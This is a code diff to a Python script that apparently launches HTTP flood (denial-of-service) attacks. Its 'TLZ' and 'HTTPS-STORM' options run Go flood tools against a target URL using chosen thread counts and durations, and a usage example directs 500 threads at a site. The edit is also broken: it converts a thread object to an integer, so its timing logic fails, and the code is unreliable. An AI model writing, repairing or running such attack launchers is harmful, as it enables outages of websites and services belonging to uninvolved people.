@@ -1458,28 +1458,29 @@ def command():
         
     elif command == "tlz" or command == "TLZ":
         target, thread, methode, t = get_info_l72()
+        timer = threading.Thread(target=countdown, args=(t,))
         timelol = time.time() + int(timer)
         while time.time() < timelol:
             try :
                 os.system(f'cd godzilla && go run TLZ.go -url {target} GET')
-                threading.Thread(target, args=(target, thread, methode, t)).start()
             except IndexError:
                 print('coba cek dulu')
                 print('pelan pelan saja')
-        timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
         
     elif command == "HTTPS-STORM" or command == "https-storm" :
         target, methode, thread, t = get_info_l72()
+        timer = threading.Thread(target=countdown, args=(t,))
         timelol = time.time() + int(timer)
         while time.time() < timelol:
             try:
                 os.system(f'cd godzilla && go run HTTPS-STORM.go {target} {thread} {methode} {t} header.txt')
-                
             except IndexError:
                 print('Usage: HTTPS-STORM <url> <threads> <get/post> <seconds> <header.txt/nil')
                 print('Example: HTTPS-STORM https://example.com 500 <get/post> 125 <header.txt/nil')
+        timer.start()
+        timer.join()
 
 ##############################################################################################
 
